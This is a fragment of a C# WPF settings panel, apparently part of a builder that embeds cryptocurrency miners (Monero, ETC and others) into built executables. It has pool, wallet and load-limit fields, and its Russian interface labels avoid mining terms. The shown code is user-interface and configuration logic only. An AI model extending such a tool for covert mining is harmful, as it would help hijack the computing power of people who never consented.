                    HorizontalAlignment = System.Windows.HorizontalAlignment.Center,
                    Margin = new Thickness(0, 8, 0, 6),
                    Cursor = System.Windows.Input.Cursors.Hand
                };
                btnSwap.Click += (s, e) => SwapModuleEndpoints(capturedMod);
                rootStack.Children.Add(btnSwap);

                // Secondary endpoint
                rootStack.Children.Add(CreateEndpointSection("ЗАДАЧА 2 (ВТОРАЯ)", mod.Secondary, capturedMod, false));

                // Dual mining compatibility banner
                if (!string.IsNullOrEmpty(mod.Primary.Algorithm) && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
                {
                    var (isValid, message) = AlgorithmRegistry.CheckDualMiningSupport(mod.Primary.Algorithm, mod.Secondary.Algorithm);
                    var banner = new Border
                    {
                        Background = isValid
                            ? new SolidColorBrush(Color.FromRgb(20, 83, 45))
                            : new SolidColorBrush(Color.FromRgb(59, 20, 25)),
                        BorderBrush = isValid
                            ? new SolidColorBrush(Color.FromRgb(34, 197, 94))
                            : new SolidColorBrush(Color.FromRgb(248, 113, 113)),
                        BorderThickness = new Thickness(1),
                        CornerRadius = new CornerRadius(6),
                        Padding = new Thickness(10, 6, 10, 6),
                        Margin = new Thickness(0, 8, 0, 2)
                    };
                    banner.Child = new TextBlock
                    {
                        Text = message,
                        Foreground = isValid
                            ? new SolidColorBrush(Color.FromRgb(134, 239, 172))
                            : new SolidColorBrush(Color.FromRgb(248, 113, 113)),
                        FontSize = 11,
                        FontWeight = FontWeights.SemiBold,
                        TextWrapping = TextWrapping.Wrap
                    };
                    rootStack.Children.Add(banner);
                }
            }

            // === RESOURCE LIMIT SLIDER ===
            var sliderContainer = new Border
            {
                Background = new SolidColorBrush(Color.FromRgb(11, 13, 19)),
                BorderBrush = new SolidColorBrush(Color.FromRgb(30, 35, 48)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(6),
                Padding = new Thickness(12, 8, 12, 8),
                Margin = new Thickness(0, 10, 0, 0)
            };
            var sliderGrid = new Grid();
            sliderGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            sliderGrid.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var sliderHeader = new Grid();
            sliderHeader.Children.Add(new TextBlock
            {
                Text = "Лимит нагрузки на систему:",
                Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 11,
                FontWeight = FontWeights.SemiBold,
                VerticalAlignment = VerticalAlignment.Center
            });
            var lblPercent = new TextBlock
            {
                Text = $"{mod.ResourceLimit}%",
                Foreground = new SolidColorBrush(Color.FromRgb(56, 189, 248)),
                FontSize = 11.5,
                FontWeight = FontWeights.Bold,
                HorizontalAlignment = System.Windows.HorizontalAlignment.Right,
                VerticalAlignment = VerticalAlignment.Center
            };
            sliderHeader.Children.Add(lblPercent);
            Grid.SetRow(sliderHeader, 0);
            sliderGrid.Children.Add(sliderHeader);

            var slider = new Slider
            {
                Minimum = 1,
                Maximum = 100,
                Value = mod.ResourceLimit,
                IsSnapToTickEnabled = true,
                TickFrequency = 1,
                Margin = new Thickness(0, 4, 0, 0),
                Style = (Style)FindResource("ModernSlider")
            };
            slider.ValueChanged += (s, e) =>
            {
                capturedMod.ResourceLimit = (int)Math.Round(e.NewValue);
                lblPercent.Text = $"{capturedMod.ResourceLimit}%";
                SaveComputeModuleConfig();
            };
            Grid.SetRow(slider, 1);
            sliderGrid.Children.Add(slider);

            sliderContainer.Child = sliderGrid;
            rootStack.Children.Add(sliderContainer);

            // === WORKER STATUS ===
            rootStack.Children.Add(CreateWorkerStatusDisplay(mod));

            card.Child = rootStack;
            return card;
        }

        /// <summary>
        /// Creates input fields for a single mining endpoint (PRIMARY or SECONDARY).
        /// </summary>
        private UIElement CreateEndpointSection(string label, ComputeEngineEndpoint endpoint, ComputeModuleConfig parentMod, bool isPrimary)
        {
            var container = new StackPanel { Margin = new Thickness(0, 8, 0, 0) };

            // Section label
            container.Children.Add(new TextBlock
            {
                Text = label,
                Foreground = new SolidColorBrush(Color.FromRgb(96, 165, 250)),
                FontSize = 10.5,
                FontWeight = FontWeights.Bold,
                Margin = new Thickness(0, 0, 0, 4)
            });

            // Algorithm dropdown
            var algoRow = new StackPanel { Margin = new Thickness(0, 0, 0, 6) };
            algoRow.Children.Add(new TextBlock
            {
                Text = "Тип задачи:",
                Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)),
                FontSize = 11,
                FontWeight = FontWeights.SemiBold,
                Margin = new Thickness(0, 0, 0, 3)
            });

            var cbAlgo = new WpfComboBox
            {
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernComboBox")
            };

            int selectedAlgoIndex = 0;
            for (int i = 0; i < AlgorithmRegistry.All.Count; i++)
            {
                var a = AlgorithmRegistry.All[i];
                cbAlgo.Items.Add(new ComboBoxItem
                {
                    Content = a.DisplayName,
                    Tag = a.Id,
                    Style = (Style)FindResource("DarkComboBoxItem")
                });
                if (string.Equals(a.Id, endpoint.Algorithm, StringComparison.OrdinalIgnoreCase))
                    selectedAlgoIndex = i;
            }
            cbAlgo.SelectedIndex = selectedAlgoIndex;

            var capturedEndpoint = endpoint;
            var capturedParent = parentMod;
            cbAlgo.SelectionChanged += (s, e) =>
            {
                if (cbAlgo.SelectedItem is ComboBoxItem ci && ci.Tag != null)
                {
                    string newAlgoId = ci.Tag.ToString() ?? "";
                    capturedEndpoint.Algorithm = newAlgoId;
                    var algoDef = AlgorithmRegistry.GetById(newAlgoId);
                    if (algoDef != null)
                    {
                        if (string.IsNullOrWhiteSpace(capturedEndpoint.Pool) || capturedEndpoint.Pool.Contains("2miners") || capturedEndpoint.Pool.Contains("supportxmr") || capturedEndpoint.Pool.Contains("woolypooly"))
                        {
                            capturedEndpoint.Pool = algoDef.DefaultPool;
                            capturedEndpoint.Port = algoDef.DefaultPort;
                        }
                        if (string.IsNullOrWhiteSpace(capturedEndpoint.Wallet) || capturedEndpoint.Wallet.StartsWith("0x000") || capturedEndpoint.Wallet.StartsWith("4...") || capturedEndpoint.Wallet.StartsWith("kaspa:..."))
                        {
                            capturedEndpoint.Wallet = algoDef.WalletPlaceholder;
                        }
                    }
                    RenderComputeModuleCards();
                    SaveComputeModuleConfig();
                }
            };
            algoRow.Children.Add(cbAlgo);
            container.Children.Add(algoRow);

            // Input fields row: Address, Server, Port, Name
            var inputGrid = new Grid();
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1.5, GridUnitType.Star) });
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(1.1, GridUnitType.Star) });
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(0.55, GridUnitType.Star) });
            inputGrid.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(0.75, GridUnitType.Star) });

            // Address
            var walletStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
            walletStack.Children.Add(new TextBlock { Text = "Адрес:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbWallet = new WpfTextBox
            {
                Text = endpoint.Wallet,
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbWallet.TextChanged += (s, e) => { capturedEndpoint.Wallet = tbWallet.Text.Trim(); SaveComputeModuleConfig(); };
            walletStack.Children.Add(tbWallet);
            Grid.SetColumn(walletStack, 0);
            inputGrid.Children.Add(walletStack);

            // Server
            var poolStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
            poolStack.Children.Add(new TextBlock { Text = "Сервер:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbPool = new WpfTextBox
            {
                Text = endpoint.Pool,
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbPool.TextChanged += (s, e) => { capturedEndpoint.Pool = tbPool.Text.Trim(); SaveComputeModuleConfig(); };
            poolStack.Children.Add(tbPool);
            Grid.SetColumn(poolStack, 1);
            inputGrid.Children.Add(poolStack);

            // Port
            var portStack = new StackPanel { Margin = new Thickness(0, 0, 8, 0) };
            portStack.Children.Add(new TextBlock { Text = "Порт:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbPort = new WpfTextBox
            {
                Text = endpoint.Port.ToString(),
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbPort.TextChanged += (s, e) =>
            {
                if (int.TryParse(tbPort.Text.Trim(), out int portVal))
                {
                    capturedEndpoint.Port = portVal;
                    SaveComputeModuleConfig();
                }
            };
            portStack.Children.Add(tbPort);
            Grid.SetColumn(portStack, 2);
            inputGrid.Children.Add(portStack);

            // Name
            var workerStack = new StackPanel();
            workerStack.Children.Add(new TextBlock { Text = "Имя:", Foreground = new SolidColorBrush(Color.FromRgb(148, 163, 184)), FontSize = 10.5, FontWeight = FontWeights.SemiBold, Margin = new Thickness(0, 0, 0, 3) });
            var tbWorker = new WpfTextBox
            {
                Text = endpoint.Worker,
                Height = 30,
                FontSize = 11,
                Style = (Style)FindResource("ModernInput")
            };
            tbWorker.TextChanged += (s, e) => { capturedEndpoint.Worker = tbWorker.Text.Trim(); SaveComputeModuleConfig(); };
            workerStack.Children.Add(tbWorker);
            Grid.SetColumn(workerStack, 3);
            inputGrid.Children.Add(workerStack);

            container.Children.Add(inputGrid);
            return container;
        }

        /// <summary>
        /// Creates a worker status display for a module card.
        /// </summary>
        private UIElement CreateWorkerStatusDisplay(ComputeModuleConfig mod)
        {
            var algoDef = AlgorithmRegistry.GetById(mod.Primary.Algorithm);
            string backendMode = algoDef?.Backend ?? "";

            // Map algorithm to legacy mode string for ComputeWorkerManager compatibility
            string legacyMode = MapAlgorithmToLegacyMode(mod.Primary.Algorithm);
            var (found, workerFileName, version, details) = ComputeWorkerManager.GetWorkerStatus(legacyMode);

            var statusBorder = new Border
            {
                Background = new SolidColorBrush(Color.FromRgb(11, 13, 19)),
                BorderBrush = new SolidColorBrush(Color.FromRgb(30, 35, 48)),
                BorderThickness = new Thickness(1),
                CornerRadius = new CornerRadius(4),
                Padding = new Thickness(10, 5, 10, 5),
                Margin = new Thickness(0, 6, 0, 0)
            };

            var statusPanel = new StackPanel { Orientation = WpfOrientation.Horizontal, VerticalAlignment = VerticalAlignment.Center };

            if (found)
            {
                statusPanel.Children.Add(new TextBlock
                {
                    Text = "✓",
                    FontSize = 13,
                    Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128)),
                    FontWeight = FontWeights.Bold,
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                });
                statusPanel.Children.Add(new TextBlock
                {
                    Text = $"Worker: {workerFileName}",
                    Foreground = new SolidColorBrush(Color.FromRgb(241, 245, 249)),
                    FontSize = 10.5,
                    FontWeight = FontWeights.SemiBold,
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                });
                var versionBadge = new Border
                {
                    Background = new SolidColorBrush(Color.FromRgb(20, 83, 45)),
                    CornerRadius = new CornerRadius(3),
                    Padding = new Thickness(4, 1, 4, 1),
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                };
                versionBadge.Child = new TextBlock
                {
                    Text = version,
                    Foreground = new SolidColorBrush(Color.FromRgb(134, 239, 172)),
                    FontSize = 9,
                    FontWeight = FontWeights.Bold
                };
                statusPanel.Children.Add(versionBadge);
                statusPanel.Children.Add(new TextBlock
                {
                    Text = "SHA-256 ✓",
                    Foreground = new SolidColorBrush(Color.FromRgb(74, 222, 128)),
                    FontSize = 9.5,
                    VerticalAlignment = VerticalAlignment.Center
                });
            }
            else
            {
                statusPanel.Children.Add(new TextBlock
                {
                    Text = "⚠",
                    FontSize = 13,
                    Foreground = new SolidColorBrush(Color.FromRgb(245, 158, 11)),
                    FontWeight = FontWeights.Bold,
                    Margin = new Thickness(0, 0, 8, 0),
                    VerticalAlignment = VerticalAlignment.Center
                });
                statusPanel.Children.Add(new TextBlock
                {
                    Text = $"Worker ({algoDef?.WorkerExecutable ?? "unknown"}) — будет подготовлен при сборке",
                    Foreground = new SolidColorBrush(Color.FromRgb(245, 158, 11)),
                    FontSize = 10.5,
                    VerticalAlignment = VerticalAlignment.Center
                });
            }

            statusBorder.Child = statusPanel;
            return statusBorder;
        }

        private static string MapAlgorithmToLegacyMode(string algorithmId)
        {
            switch (algorithmId?.ToLowerInvariant())
            {
                case "etc": return "ethereum-classic";
                case "xmr": return "monero";
                case "kas": return "ethereum-classic"; // KAS uses lolMiner like ETC
                case "rvn": return "ethereum-classic"; // RVN uses lolMiner like ETC
                case "ergo": return "ethereum-classic"; // ERGO uses lolMiner like ETC
                default: return "monero";
            }
        }

        private void UpdateModuleStatusBadge(Border card, ComputeModuleConfig mod)
        {
            // Find status badge within the card and update it
            // Simple approach: re-render all cards
            RenderComputeModuleCards();
        }

        private System.Windows.Controls.Button CreateSmallButton(string text, string bgColor, string fgColor)
        {
            var bgBrush = (SolidColorBrush)new BrushConverter().ConvertFromString(bgColor)!;
            var fgBrush = (SolidColorBrush)new BrushConverter().ConvertFromString(fgColor)!;

            return new System.Windows.Controls.Button
            {
                Content = text,
                Height = 24,
                Padding = new Thickness(8, 0, 8, 0),
                FontSize = 10.5,
                Foreground = fgBrush,
                Background = bgBrush,
                BorderBrush = bgBrush,
                BorderThickness = new Thickness(1),
                Cursor = System.Windows.Input.Cursors.Hand
            };
        }

        public (bool isValid, string error) ValidateComputeModuleConfig()
        {
            bool isEnabled = chkComputeEnabled?.IsChecked == true;

            // If compute globally disabled, no validation needed
            if (!isEnabled)
                return (true, "");

            if (ComputeConfig.Modules.Count == 0)
                return (true, ""); // No modules to validate

            var allErrors = new List<string>();
            for (int i = 0; i < ComputeConfig.Modules.Count; i++)
            {
                var mod = ComputeConfig.Modules[i];
                if (!mod.Enabled) continue; // Skip disabled modules

                var (isValid, errors) = mod.Validate(i);
                if (!isValid)
                    allErrors.AddRange(errors);
            }

            if (allErrors.Count > 0)
                return (false, string.Join("\n", allErrors));

            return (true, "");
        }

        private void SaveComputeModuleConfig()
        {
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(_computeConfigFilePath)!);
                ComputeConfig.Enabled = chkComputeEnabled?.IsChecked == true;
                string json = JsonSerializer.Serialize(ComputeConfig, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(_computeConfigFilePath, json, Encoding.UTF8);
            }
            catch { }
        }

        private void LoadComputeModuleConfig()
        {
            try
            {
                if (!File.Exists(_computeConfigFilePath)) return;

                string json = File.ReadAllText(_computeConfigFilePath, Encoding.UTF8);
                using var doc = JsonDocument.Parse(json);
                var root = doc.RootElement;

                // Detect legacy format (has "mode" + "walletAddress" at top level = old single-module config)
                if (root.TryGetProperty("walletAddress", out _) && root.TryGetProperty("mode", out _))
                {
                    // Legacy migration
                    var legacyDict = new Dictionary<string, object>();
                    foreach (var prop in root.EnumerateObject())
                    {
                        legacyDict[prop.Name] = prop.Value;
                    }
                    ComputeConfig = ComputeRootConfig.MigrateFromLegacy(legacyDict);
                    Log("📦 Compute: выполнена миграция конфигурации старого формата → modules[]");
                }
                else
                {
                    // New format — deserialize directly
                    var config = JsonSerializer.Deserialize<ComputeRootConfig>(json);
                    if (config != null)
                    {
                        ComputeConfig = config;
                    }
                }

                chkComputeEnabled.IsChecked = ComputeConfig.Enabled;
            }
            catch (Exception ex)
            {
                Log("⚠️ Ошибка загрузки конфигурации Compute: " + ex.Message);
            }
        }

        private static bool IsComputeModuleKey(string? key)
        {
            if (string.IsNullOrWhiteSpace(key)) return false;
            string k = key.Trim();
            return k.Equals("mode", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("walletAddress", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("serverAddress", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("serverPort", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("workerName", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("resourceLimit", StringComparison.OrdinalIgnoreCase) ||
                   k.Equals("enabled", StringComparison.OrdinalIgnoreCase);
        }
        #endregion

        private static int IndexOfBytes(byte[] src, byte[] pattern, int start)
        {
            int max = src.Length - pattern.Length;
            for (int i = start; i <= max; i++)
            {
                if (src[i] == pattern[0])
                {
                    bool match = true;
                    for (int j = 1; j < pattern.Length; j++)
                    {
                        if (src[i + j] != pattern[j]) { match = false; break; }
                    }
                    if (match) return i;
                }
            }
            return -1;
        }
    }
}